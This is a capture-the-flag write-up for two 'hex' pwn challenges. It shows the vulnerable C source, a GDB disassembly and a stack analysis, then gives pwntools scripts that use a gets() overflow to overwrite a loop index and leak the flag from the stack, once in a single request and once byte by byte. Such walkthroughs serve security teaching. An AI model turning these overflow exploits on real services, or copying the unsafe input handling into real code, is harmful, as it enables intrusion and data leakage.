This was a pretty easy pwn challenge with 138 solves during the CTF.
here is the source code:
```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    int i = 0;

    char name[16];
    printf("input text to convert to hex: \n");
    gets(name);

    char flag[64];
    fgets(flag, 64, fopen("flag.txt", "r"));
    // TODO: PRINT FLAG for cool people ... but maybe later

    while (i < 16)
    {
        // the & 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe
        printf("%02X", (unsigned int)(name[i] & 0xFF));
        i++;
    }
    printf("\n");
}
```

Pretty straightforward. it will take our name, and convert it to hex.
it will also store the `flag` variable on the stack.
Input is taken using the `gets` function, which is known as an unsafe function, which leads to buffer overflow.
Best thing to do when solving pwn chals, is to use GDB. lets run gdb with the challenge binary, and disassemble main:
```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0000000000401186 <+0>:	push   rbp
   0x0000000000401187 <+1>:	mov    rbp,rsp
   0x000000000040118a <+4>:	sub    rsp,0x60
   0x000000000040118e <+8>:	mov    rax,QWORD PTR [rip+0x2eab]        # 0x404040 <stdout@GLIBC_2.2.5>
   0x0000000000401195 <+15>:	mov    esi,0x0
   0x000000000040119a <+20>:	mov    rdi,rax
   0x000000000040119d <+23>:	call   0x401050 <setbuf@plt>
   0x00000000004011a2 <+28>:	mov    rax,QWORD PTR [rip+0x2eb7]        # 0x404060 <stderr@GLIBC_2.2.5>
   0x00000000004011a9 <+35>:	mov    esi,0x0
   0x00000000004011ae <+40>:	mov    rdi,rax
   0x00000000004011b1 <+43>:	call   0x401050 <setbuf@plt>
   0x00000000004011b6 <+48>:	mov    DWORD PTR [rbp-0x4],0x0
   0x00000000004011bd <+55>:	mov    edi,0x402010
   0x00000000004011c2 <+60>:	call   0x401040 <puts@plt>
   0x00000000004011c7 <+65>:	lea    rax,[rbp-0x20]
   0x00000000004011cb <+69>:	mov    rdi,rax
   0x00000000004011ce <+72>:	mov    eax,0x0
   0x00000000004011d3 <+77>:	call   0x401080 <gets@plt>
   0x00000000004011d8 <+82>:	mov    esi,0x40202f
   0x00000000004011dd <+87>:	mov    edi,0x402031
   0x00000000004011e2 <+92>:	call   0x401090 <fopen@plt>
   0x00000000004011e7 <+97>:	mov    rdx,rax
   0x00000000004011ea <+100>:	lea    rax,[rbp-0x60]
   0x00000000004011ee <+104>:	mov    esi,0x40
   0x00000000004011f3 <+109>:	mov    rdi,rax
   0x00000000004011f6 <+112>:	call   0x401070 <fgets@plt>
   0x00000000004011fb <+117>:	jmp    0x401222 <main+156>
   0x00000000004011fd <+119>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401200 <+122>:	cdqe   
   0x0000000000401202 <+124>:	movzx  eax,BYTE PTR [rbp+rax*1-0x20]
   0x0000000000401207 <+129>:	movsx  eax,al
   0x000000000040120a <+132>:	movzx  eax,al
   0x000000000040120d <+135>:	mov    esi,eax
   0x000000000040120f <+137>:	mov    edi,0x40203a
   0x0000000000401214 <+142>:	mov    eax,0x0
   0x0000000000401219 <+147>:	call   0x401060 <printf@plt>
   0x000000000040121e <+152>:	add    DWORD PTR [rbp-0x4],0x1
   0x0000000000401222 <+156>:	cmp    DWORD PTR [rbp-0x4],0xf
   0x0000000000401226 <+160>:	jle    0x4011fd <main+119>
   0x0000000000401228 <+162>:	mov    edi,0xa
   0x000000000040122d <+167>:	call   0x401030 <putchar@plt>
   0x0000000000401232 <+172>:	mov    eax,0x0
   0x0000000000401237 <+177>:	leave  
   0x0000000000401238 <+178>:	ret    
End of assembler dump.
pwndbg> 
```
We can understand a few things from this code.
First of all, RBP is a register that points to the stack base address, and each local variable is stored in a constant offset from it.
Lets try to understand where each local variable is stored.
In line `main+65`, we can see that the code set `rax` to be `rbp-0x20`, then it is moved to `rdi`, and `gets` is called.
The calling convention is 64bit is to use registers to pass arguments to functions. RDI is used for the first argument, RSI for the second, etc.
So, before calling to `gets`, the code moved `rbp-0x20` to `RDI`, which means that `rbp-0x20` is `gets` argument. in the c code we can see that `name` is the parameter for `gets`, so we can understand that `name` is stored in `rbp-0x20`
In line `main+156`, we can see that the assembly is comparing the value stored at `rbp-0x4` with 0xf=15. this is the condition of the while loop! so we know that `i` is stored at `rbp-0x4`.
We can also see in line `main+100`, that the code sets `rdi` to be `rbp-0x60`, and then calls to `fgets`. thats the fgets that reads the flag. so we can know that the flag is in `rbp-0x60`
The stack will look somehting like this:
![image](https://github.com/Itay212121/Weekly-CTF/assets/56035342/cedd3c85-8c71-4dbf-9197-4c9a508bb5dc)

Now, we know enough to be able to exploit this.
Using `gets(name)`, we can trigger a bufferoverflow, and override the `i` variable that is stored after name, and change it to whatever we want!
i is stored at `rbp-0x4`, name is stored at `rbp-0x20`, so we need `0x20-0x4=28` bytes to reach it. 
Now, what should we change it to?
When printing `name` to us, it uses this assembly lines to get the current character:
```
<+119>:	mov    eax,DWORD PTR [rbp-0x4]
<+124>:	movzx  eax,BYTE PTR [rbp+rax*1-0x20]
```
it takes `i`, and puts it in `eax`. then it reads `rbp-0x20+i`. to get the current character.
So in order to read the flag, which is stored in `rbp-0x60`, we need `i=-0x40` to reach it.
i is a regular int, so changing it to a negative number is possible.

Here is the final exploit
```py
from pwn import *
p = remote('amt.rs' , 31630)

p.recvline()
p.sendline(b"A" * 28 + p32(0xffffffff - 0x40))

print(bytes.fromhex(p.recvline().decode()) )
```

Ez and fun challenge.

*Hex 2*

this challenge is pretty much the same as hex2. here is the source code:
```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    int i = 0;

    char name[16];
    printf("input text to convert to hex: \n");
    gets(name);

    char flag[64];
    fgets(flag, 64, fopen("flag.txt", "r"));
    // TODO: PRINT FLAG for cool people ... but maybe later

    while (1)
    {
        // the & 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe
        printf("%02X", (unsigned int)(name[i] & 0xFF));

        // exit out of the loop
        if (i <= 0)
        {
            printf("\n");
            return 0;
        }
        i--;
    }
}
```
The only difference is that inside the while loop, it checks for negative i, and exits.
The stack will look exactly the same as hex1, so we can override i again.
As we can see in the while loop, it will print the `name[i]` for us, and then exit! this is good to us, because this way we can leak the flag byte by byte. here is the exploit:

```py
from pwn import *
elf = ELF("./chal")

flag = ''
for i in range(1, 70):
	p = remote('amt.rs' , 31631)
	p.recvline()
	p.sendline(b"A" * 28 + p32(0xffffffff - 0x40 + i))
	flag += chr(int(p.recvline()[:-1].decode(), 16))
	print(flag)
	p.close()
```
